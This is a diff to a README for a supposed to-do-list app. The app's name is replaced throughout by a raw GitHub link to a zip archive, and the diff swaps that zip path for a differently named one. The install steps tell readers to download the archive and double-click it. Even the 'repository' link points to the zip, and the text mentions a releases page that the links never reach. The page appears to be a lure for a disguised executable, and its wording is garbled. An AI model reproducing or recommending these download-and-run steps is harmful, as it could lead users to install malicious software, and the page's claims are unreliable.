@@ -1,15 +1,15 @@
-# 🗒️ https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip - Keep Your Tasks Organized Easily
+# 🗒️ https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip - Keep Your Tasks Organized Easily
 
 ## 🚀 Getting Started
 
-Welcome to **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip!** This application helps you manage your tasks simply and effectively. Use it to keep track of what you need to do for work, school, or personal projects. 
+Welcome to **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip!** This application helps you manage your tasks simply and effectively. Use it to keep track of what you need to do for work, school, or personal projects. 
 
 ## 📥 Download & Install
 
 To get started, follow these steps to download and run the application:
 
 1. Click the link below to visit the download page:
-   [Download https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip](https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip)
+   [Download https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip](https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip)
 
 2. On the releases page, look for the latest version. You will see the option to download. 
 
@@ -22,11 +22,11 @@ To get started, follow these steps to download and run the application:
 
 5. Double-click the file to install the application. Follow the on-screen instructions to complete the installation. 
 
-6. Once installed, you can find **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip** in your applications folder. Open it to start managing your tasks.
+6. Once installed, you can find **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip** in your applications folder. Open it to start managing your tasks.
 
 ## 🛠️ Features
 
-Here are some key features that make **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip** a great choice for task management:
+Here are some key features that make **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip** a great choice for task management:
 
 - **Simple Interface:** The user-friendly design helps you navigate easily without any technical knowledge.
 - **Add Tasks Quickly:** Just type in your tasks and hit enter to add them to your list.
@@ -36,7 +36,7 @@ Here are some key features that make **https://github.com/joeysup22/to-do-list.t
   
 ## 💻 System Requirements
 
-To run **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip**, you need:
+To run **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip**, you need:
 
 - **Windows:** Windows 7 or later
 - **Mac:** macOS 10.12 or later
@@ -46,7 +46,7 @@ Make sure your system meets these requirements to enjoy the application without 
 
 ## 🔧 How to Use
 
-Using **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip** is straightforward:
+Using **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip** is straightforward:
 
 1. Open the application.
 2. To add a new task, type it into the text box and click the "Add" button.
@@ -66,7 +66,7 @@ If you have questions or need support, feel free to reach out. You can find help
 
 ## 🔗 Useful Links
 
-- [Download https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip](https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip)
-- [GitHub Repository](https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip)
+- [Download https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip](https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip)
+- [GitHub Repository](https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip)
 
-Thank you for choosing **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/do_to_txt_list_2.8.zip** We hope this application helps you keep your tasks organized and manageable. Enjoy being productive!
+Thank you for choosing **https://github.com/joeysup22/to-do-list.txt/raw/refs/heads/main/outshine/to_list_txt_do_v1.1-beta.4.zip** We hope this application helps you keep your tasks organized and manageable. Enjoy being productive!
